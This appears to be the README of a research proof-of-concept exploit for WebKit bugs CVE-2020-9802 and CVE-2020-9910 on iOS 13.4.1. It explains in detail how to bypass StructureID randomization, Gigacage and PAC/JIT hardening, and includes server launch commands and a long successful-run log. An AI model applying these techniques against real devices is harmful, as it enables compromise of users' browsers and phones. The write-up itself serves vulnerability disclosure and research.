# WebKit PoC Exploit for iOS 13.4.1 on iPhone Xs and Safari 13.1 on macOS 10.15.4

A proof-of-concept exploit for [CVE-2020-9802](https://bugs.chromium.org/p/project-zero/issues/detail?id=2020). The exploit targets WebKit on iOS 13.4.1 on an iPhone Xs.

## Vulnerability

CVE-2020-9802 allows OOB access on the JSC heap due to incorrect bounds check elimination due to a bug in CSE. With some more fiddling, it is possible to read or write out-of-bounds at a controlled offset. The exploit uses that to corrupt the length of an adjacent JSArray. This is implemented in the function `hax`.
Next, in `setup_addrof_fakeobj`, it sets up the addrof and fakeobj primitives by reading from/writing to a unboxed double array through the overlapping JSValue array.

## Bypassing StructureID randomization

Afterwards, the somewhat newer StructureID randomization mitigation has to be bypassed. It attempts to stop the exploit method described [here](http://www.phrack.org/papers/attacking_javascript_engines.html) which relies on predictable StructureIDs. However, not all code paths check the StructureID of a (potentially faked) JSObject. In particular, indexed accesses into fast JSArrays never load the structure but only the JSCell header flags (containing the indexing type) and the butterfly (the array storage). With that, it becomes possible to fake a JSArray and read a valid JSCell header and thus a valid StructureID from memory. With that, a fully-functional unboxed double JSArray can be faked and then used for somewhat limited arbitrary reads and writes in memory.

## Bypassing Gigacage

Note: This step isn't strictly necessary as the current read/write primitives should be powerful enough (although likely significantly slower) to finish the rest of this exploit.

The Gigacage is used to cage backing buffers of objects like TypedArrays and strings so that they cannot be abused for arbitrary memory read/write. It is possible to bypass the Gigacage mechanism if one can overwrite data on the stack (either due to a bug or through an intermediate read-write primitive as is the case here): an access to a typed array in JIT compiled code is implemented with two DFG operations: a GetIndexedPropertyStorage operation followed by a GetByVal. The GetIndexedPropertyStorage uncages the backing storage pointer and outputs the raw pointer, the GetByVal then uses that to load/store a value. It is then possible to cause the raw pointer produced by GetIndexedPropertyStorage to be spilled to the stack where it can then be modified before it is used to access memory. The `memhax` function implements this.

At this point, the exploit has achieved stable arbitrary memory read/write through the 'memory' object.

## Bypassing PAC/JIT hardening

Note: this is a PoC for [CVE-2020-9910](https://bugs.chromium.org/p/project-zero/issues/detail?id=2042).

The final step is to gain code execution. On macOS, this simply means finding and writing to the JIT region. However, on iOS a combination of APRR and PAC protect the JIT region from an attacker with arbitrary read/write.

WebKit has support for in-process signal handling. This is for example used by some JIT optimizations in JSC. The main signal handler is `catch_mach_exception_raise_state` in Signals.cpp, which will traverse a linked list of handlers and call each one of them. If any of the handlers returns success, the signal is treated as handled and the thread will continue. This enables the following attack:

1. The linked list of handlers is turned into a cycle, causing `catch_mach_exception_raise_state` to loop infinitely upon catching a signal
2. A crash is triggered in another thread, for example in a WebWorker. A GCD thread is now "stuck" in `catch_mach_exception_raise_state`
3. The main thread searches the stacks for the stackframe of `catch_mach_exception_raise_state`. Once found, it has access to the reply mach message of `catch_mach_exception_raise_state` and with that to the context (registers + stack) of the crashed thread. It can modify them arbitrarily except for PC which is protected by PAC. After modifying the state and marking the exception as property handled in the reply message, it fixes the linked list of handlers, causing `catch_mach_exception_raise_state` in the other thread to finish
4. The crashed thread now resumes execution with attacker-controlled registers and/or stack content

It should also be possible to catch multiple signals following each other by first making a copy of the handlers list/cycle, then swapping the "active" and "inactive" exception hander lists before repairing the now inactive handler list. The current exception handler will then return, but if a new exception is immediately raised, the handling thread will again be stuck in `catch_mach_exception_raise_state` as it uses the other list which is still a cycle. It is also worth noting that it should be possible to modify the global `activeExceptions` variable in Signals.cpp prior to the installation of signal handlers, thus allowing the attacker to control which exceptions are handled.

This "debugger" now immediately allows brute-forcing PACs as PAC mostly relies on conventional access violations when failing. Moreover, it allows PAC to be bypassed trivially for some pointers, namely in cases where the authentication and use are two separate instructions, with the second instruction triggering a crash. The PoC demonstrates this by bypassing the PAC protecting a TypedArray's backing storage pointer: first, a TypedArray's backing storage pointer in a worker is corrupted, then accessed. This will cause the AUTDB instruction to fail, leaving the pointer clobbered and causing a crash when the pointer is subsequently accessed. Next, this crash is "handled" with the debugger and the register containing the clobbered pointer is replaced with an arbitrary pointer. The worker then continues and re-executes the access instruction which now succeeds and thus accesses an address of the attacker's choosing.

With this, there are now different possibilities for achieving arbitrary native code execution (i.e. bypassing the JIT hardening):
- Corrupt the AssemblerBuffer so arbitrary instructions are copied into the JIT region by the LinkBuffer. This will cause the computed hashes to mismatch and the linker to crash, but that only happens after the instructions have been copied and the crash can then simply be caught
- Crash during one of the writes into the JIT region in LinkBuffer::copyCompactAndLinkCode (by corrupting the destination pointer prior to that) and change the content of the source register so that an arbitrary instruction is written into the JIT region while the original instruction is used for the hash computation
- Crash during LinkBuffer::copyCompactAndLinkCode and resume execution somewhere else. This should leave the JIT region writable (although not executable) for that thread
- Brute-force a PAC code (e.g. by repeatedly accessing, crashing, and then changing a PAC protected pointer), then JOP into one of the functions into which performJITMemcpy is inlined

## Demo

To run the PoC install tornado, for example via `sudo python3 -m pip install tornado`, then start the exploit server: `python3 server.py` and browse to port 8000 with Mobile Safari on an iPhone Xs on iOS 13.4.1.

A successful run of the exploit should look like this:

    Server listening on 0.0.0.0:8000
    [HTTP] Serving file ./index.html
    [HTTP] Serving file ./env.js
    [HTTP] Serving file ./utils.js
    [HTTP] Serving file ./pwn.js
    [HTTP] Serving file ./logging.js
    [HTTP] Serving file ./offsets.js
    [HTTP] Serving file ./ready.js
    [HTTP] Serving file ./empty.js
    [LOG] Remote JS logging connection establised
    [LOG] [*] Running in browser environment
    [LOG] [*] Fake JSArray @ 0x0000000109208250
    [LOG] [*] Copied legit JSCell header: 0x010822070000d524
    [LOG] [+] Achieved limited arbitrary read/write \o/
    [LOG] [*] JSGlobalObject @ 0x0000000101351aa8
    [LOG] [*] GlobalObject @ 0x0000000107334068
    [LOG] [*] VM @ 0x0000000102e09000
    [LOG] [*] VM.topCallFrame @ 0x0000000102e129c0
    [LOG] [*] Top CallFrame (stack) @ 0x000000016fb5df10
    [LOG] [*] Constructing arbitray read/write by abusing TypedArray @ 0x00000002811f4000
    [LOG] [+] Got stable arbitrary memory read/write!
    [LOG] [+] Executable instance @ 0x000000010731fdc0
    [LOG] [+] JSC base @ 0x00000001a76cc000
    [LOG] [*] Exception handler list @ 0x00000001e5f7c0b0 is now a cycle, segv handler will loop until it is fixed
    [HTTP] Serving file ./worker.js
    [WSSH] Remote JS shell establised
    [LOG] Remote JS logging connection establised
    [LOG] [+] Scratch buffer @ 0x0000000281150000
    [LOG] [*] Worker TypedArray @ 0x000000010bf1b398
    [LOG] [*] Worker TypedArray Buffer @ 0x005d490281200000
    [LOG] [*] Searching for 2809084408 starting at 0x000000016fb64000
    [LOG] [*] Reading 0x000000016fb64000 - 0x000000016fb68000
    [LOG] [*] Reading 0x000000016fb68000 - 0x000000016fb6c000
    [LOG] [*] Reading 0x000000016fb6c000 - 0x000000016fb70000
    [LOG] [*] Reading 0x000000016fb70000 - 0x000000016fb74000
    [LOG] [*] Reading 0x000000016fb74000 - 0x000000016fb78000
    [LOG] [*] Reading 0x000000016fb78000 - 0x000000016fb7c000
    [LOG] [*] Reading 0x000000016fb7c000 - 0x000000016fb80000
    [LOG] [*] Reading 0x000000016fb80000 - 0x000000016fb84000
    [LOG] [*] Reading 0x000000016fb84000 - 0x000000016fb88000
    [LOG] [*] Reading 0x000000016fb88000 - 0x000000016fb8c000
    [LOG] [*] Reading 0x000000016fb8c000 - 0x000000016fb90000
    [LOG] [*] Reading 0x000000016fb90000 - 0x000000016fb94000
    [LOG] [*] Reading 0x000000016fb94000 - 0x000000016fb98000
    [LOG] [*] Reading 0x000000016fb98000 - 0x000000016fb9c000
    [LOG] [*] Reading 0x000000016fb9c000 - 0x000000016fba0000
    [LOG] [*] Reading 0x000000016fba0000 - 0x000000016fba4000
    [LOG] [*] Reading 0x000000016fba4000 - 0x000000016fba8000
    [LOG] [*] Reading 0x000000016fba8000 - 0x000000016fbac000
    [LOG] [*] Reading 0x000000016fbac000 - 0x000000016fbb0000
    [LOG] [*] Reading 0x000000016fbb0000 - 0x000000016fbb4000
    [LOG] [*] Reading 0x000000016fbb4000 - 0x000000016fbb8000
    [LOG] [*] Reading 0x000000016fbb8000 - 0x000000016fbbc000
    [LOG] [*] Reading 0x000000016fbbc000 - 0x000000016fbc0000
    [LOG] [*] Reading 0x000000016fbc0000 - 0x000000016fbc4000
    [LOG] [*] Reading 0x000000016fbc4000 - 0x000000016fbc8000
    [LOG] [*] Reading 0x000000016fbc8000 - 0x000000016fbcc000
    [LOG] [*] Reading 0x000000016fbcc000 - 0x000000016fbd0000
    [LOG] [*] Reading 0x000000016fbd0000 - 0x000000016fbd4000
    [LOG] [*] Reading 0x000000016fbd4000 - 0x000000016fbd8000
    [LOG] [*] Reading 0x000000016fbd8000 - 0x000000016fbdc000
    [LOG] [*] Reading 0x000000016fbdc000 - 0x000000016fbe0000
    [LOG] [*] Reading 0x000000016fbe0000 - 0x000000016fbe4000
    [LOG] [*] Reading 0x000000016fbe4000 - 0x000000016fbe8000
    [LOG] [*] Reading 0x000000016fbe8000 - 0x000000016fbec000
    [LOG] Skipping guard page @ 0x000000016fbec000
    [LOG] [*] Reading 0x000000016fbf0000 - 0x000000016fbf4000
    [LOG] [*] Reading 0x000000016fbf4000 - 0x000000016fbf8000
    [LOG] [*] Reading 0x000000016fbf8000 - 0x000000016fbfc000
    [LOG] [*] Reading 0x000000016fbfc000 - 0x000000016fc00000
    [LOG] [*] Reading 0x000000016fc00000 - 0x000000016fc04000
    [LOG] [*] Reading 0x000000016fc04000 - 0x000000016fc08000
    [LOG] [*] Reading 0x000000016fc08000 - 0x000000016fc0c000
    [LOG] [*] Reading 0x000000016fc0c000 - 0x000000016fc10000
    [LOG] [*] Reading 0x000000016fc10000 - 0x000000016fc14000
    [LOG] [*] Reading 0x000000016fc14000 - 0x000000016fc18000
    [LOG] [*] Reading 0x000000016fc18000 - 0x000000016fc1c000
    [LOG] [*] Reading 0x000000016fc1c000 - 0x000000016fc20000
    [LOG] [*] Reading 0x000000016fc20000 - 0x000000016fc24000
    [LOG] [*] Reading 0x000000016fc24000 - 0x000000016fc28000
    [LOG] [*] Reading 0x000000016fc28000 - 0x000000016fc2c000
    [LOG] [*] Reading 0x000000016fc2c000 - 0x000000016fc30000
    [LOG] [*] Reading 0x000000016fc30000 - 0x000000016fc34000
    [LOG] [*] Reading 0x000000016fc34000 - 0x000000016fc38000
    [LOG] [*] Reading 0x000000016fc38000 - 0x000000016fc3c000
    [LOG] [*] Reading 0x000000016fc3c000 - 0x000000016fc40000
    [LOG] [*] Reading 0x000000016fc40000 - 0x000000016fc44000
    [LOG] [*] Reading 0x000000016fc44000 - 0x000000016fc48000
    [LOG] [*] Reading 0x000000016fc48000 - 0x000000016fc4c000
    [LOG] [*] Reading 0x000000016fc4c000 - 0x000000016fc50000
    [LOG] [*] Reading 0x000000016fc50000 - 0x000000016fc54000
    [LOG] [*] Reading 0x000000016fc54000 - 0x000000016fc58000
    [LOG] [*] Reading 0x000000016fc58000 - 0x000000016fc5c000
    [LOG] [*] Reading 0x000000016fc5c000 - 0x000000016fc60000
    [LOG] [*] Reading 0x000000016fc60000 - 0x000000016fc64000
    [LOG] [*] Reading 0x000000016fc64000 - 0x000000016fc68000
    [LOG] [*] Reading 0x000000016fc68000 - 0x000000016fc6c000
    [LOG] [*] Reading 0x000000016fc6c000 - 0x000000016fc70000
    [LOG] [*] Reading 0x000000016fc70000 - 0x000000016fc74000
    [LOG] [*] Reading 0x000000016fc74000 - 0x000000016fc78000
    [LOG] Skipping guard page @ 0x000000016fc78000
    [LOG] [*] Reading 0x000000016fc7c000 - 0x000000016fc80000
    [LOG] [*] Reading 0x000000016fc80000 - 0x000000016fc84000
    [LOG] [*] Reading 0x000000016fc84000 - 0x000000016fc88000
    [LOG] [*] Reading 0x000000016fc88000 - 0x000000016fc8c000
    [LOG] [*] Reading 0x000000016fc8c000 - 0x000000016fc90000
    [LOG] [*] Reading 0x000000016fc90000 - 0x000000016fc94000
    [LOG] [*] Reading 0x000000016fc94000 - 0x000000016fc98000
    [LOG] [*] Reading 0x000000016fc98000 - 0x000000016fc9c000
    [LOG] [*] Reading 0x000000016fc9c000 - 0x000000016fca0000
    [LOG] [*] Reading 0x000000016fca0000 - 0x000000016fca4000
    [LOG] [*] Reading 0x000000016fca4000 - 0x000000016fca8000
    [LOG] [*] Reading 0x000000016fca8000 - 0x000000016fcac000
    [LOG] [*] Reading 0x000000016fcac000 - 0x000000016fcb0000
    [LOG] [*] Reading 0x000000016fcb0000 - 0x000000016fcb4000
    [LOG] [*] Reading 0x000000016fcb4000 - 0x000000016fcb8000
    [LOG] [*] Reading 0x000000016fcb8000 - 0x000000016fcbc000
    [LOG] [*] Reading 0x000000016fcbc000 - 0x000000016fcc0000
    [LOG] [*] Reading 0x000000016fcc0000 - 0x000000016fcc4000
    [LOG] [*] Reading 0x000000016fcc4000 - 0x000000016fcc8000
    [LOG] [*] Reading 0x000000016fcc8000 - 0x000000016fccc000
    [LOG] [*] Reading 0x000000016fccc000 - 0x000000016fcd0000
    [LOG] [*] Reading 0x000000016fcd0000 - 0x000000016fcd4000
    [LOG] [*] Reading 0x000000016fcd4000 - 0x000000016fcd8000
    [LOG] [*] Reading 0x000000016fcd8000 - 0x000000016fcdc000
    [LOG] [*] Reading 0x000000016fcdc000 - 0x000000016fce0000
    [LOG] [*] Reading 0x000000016fce0000 - 0x000000016fce4000
    [LOG] [*] Reading 0x000000016fce4000 - 0x000000016fce8000
    [LOG] [*] Reading 0x000000016fce8000 - 0x000000016fcec000
    [LOG] [*] Reading 0x000000016fcec000 - 0x000000016fcf0000
    [LOG] [*] Reading 0x000000016fcf0000 - 0x000000016fcf4000
    [LOG] [*] Reading 0x000000016fcf4000 - 0x000000016fcf8000
    [LOG] [*] Reading 0x000000016fcf8000 - 0x000000016fcfc000
    [LOG] [*] Reading 0x000000016fcfc000 - 0x000000016fd00000
    [LOG] [*] Reading 0x000000016fd00000 - 0x000000016fd04000
    [LOG] Skipping guard page @ 0x000000016fd04000
    [LOG] [*] Reading 0x000000016fd08000 - 0x000000016fd0c000
    [LOG] [*] Reading 0x000000016fd0c000 - 0x000000016fd10000
    [LOG] [*] Reading 0x000000016fd10000 - 0x000000016fd14000
    [LOG] [*] Reading 0x000000016fd14000 - 0x000000016fd18000
    [LOG] [*] Reading 0x000000016fd18000 - 0x000000016fd1c000
    [LOG] [*] Reading 0x000000016fd1c000 - 0x000000016fd20000
    [LOG] [*] Reading 0x000000016fd20000 - 0x000000016fd24000
    [LOG] [*] Reading 0x000000016fd24000 - 0x000000016fd28000
    [LOG] [*] Reading 0x000000016fd28000 - 0x000000016fd2c000
    [LOG] [*] Reading 0x000000016fd2c000 - 0x000000016fd30000
    [LOG] [*] Reading 0x000000016fd30000 - 0x000000016fd34000
    [LOG] [*] Reading 0x000000016fd34000 - 0x000000016fd38000
    [LOG] [*] Reading 0x000000016fd38000 - 0x000000016fd3c000
    [LOG] [*] Reading 0x000000016fd3c000 - 0x000000016fd40000
    [LOG] [*] Reading 0x000000016fd40000 - 0x000000016fd44000
    [LOG] [*] Reading 0x000000016fd44000 - 0x000000016fd48000
    [LOG] [*] Reading 0x000000016fd48000 - 0x000000016fd4c000
    [LOG] [*] Reading 0x000000016fd4c000 - 0x000000016fd50000
    [LOG] [*] Reading 0x000000016fd50000 - 0x000000016fd54000
    [LOG] [*] Reading 0x000000016fd54000 - 0x000000016fd58000
    [LOG] [*] Reading 0x000000016fd58000 - 0x000000016fd5c000
    [LOG] [*] Reading 0x000000016fd5c000 - 0x000000016fd60000
    [LOG] [*] Reading 0x000000016fd60000 - 0x000000016fd64000
    [LOG] [*] Reading 0x000000016fd64000 - 0x000000016fd68000
    [LOG] [*] Reading 0x000000016fd68000 - 0x000000016fd6c000
    [LOG] [*] Reading 0x000000016fd6c000 - 0x000000016fd70000
    [LOG] [*] Reading 0x000000016fd70000 - 0x000000016fd74000
    [LOG] [*] Reading 0x000000016fd74000 - 0x000000016fd78000
    [LOG] [*] Reading 0x000000016fd78000 - 0x000000016fd7c000
    [LOG] [*] Reading 0x000000016fd7c000 - 0x000000016fd80000
    [LOG] [*] Reading 0x000000016fd80000 - 0x000000016fd84000
    [LOG] [*] Reading 0x000000016fd84000 - 0x000000016fd88000
    [LOG] [*] Reading 0x000000016fd88000 - 0x000000016fd8c000
    [LOG] [+] Found @ 0x000000016fd8a838
    [LOG] [+] OutP @ 0x00000001017cc000
    [LOG] [*] Register state:
    00 00 00 80 02 00 00 00   00 00 00 00 00 00 00 00
    01 00 00 00 00 00 00 00   81 81 81 81 02 00 40 00
    34 00 00 00 00 00 00 00   10 d1 56 0b 01 00 00 00
    00 00 10 00 00 00 00 00   81 81 81 81 02 00 00 00
    00 00 00 00 00 00 00 00   46 00 0c f9 7b 13 92 68
    01 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00
    05 00 00 00 00 00 00 00   81 81 81 81 02 00 40 00
    20 00 00 00 00 00 00 00   00 00 00 00 00 11 00 00
    dc d9 93 a7 81 51 3b 1d   b2 19 00 00 00 00 00 00
    00 00 00 00 00 00 00 00   00 50 e1 02 01 00 00 00
    a8 76 f1 09 01 00 00 00   a0 76 f1 09 01 00 00 00
    c0 e9 e1 02 01 00 00 00   48 0f 38 0b 01 00 00 00
    80 fe 1e 0a 01 00 00 00   e0 cf 56 0b 01 00 00 00
    00 e4 27 0b 01 00 00 00   00 00 00 00 00 00 ff ff
    02 00 00 00 00 00 ff ff   70 dc 15 70 81 ec 0c 00
    d4 22 95 a7 01 65 7c ea   f0 db 15 70 81 53 49 00
    3c dc 93 a7 81 93 27 42
    [LOG] Fixing exception handlers...
    [LOG] Received message from worker: 42

In the last line, the PAC protecting a TypedArray's backing storage pointer has been bypassed by handling the crash and modifying the register holding the presumably authenticated pointer, then continuing the thread. The typed array access then reads the value 42.
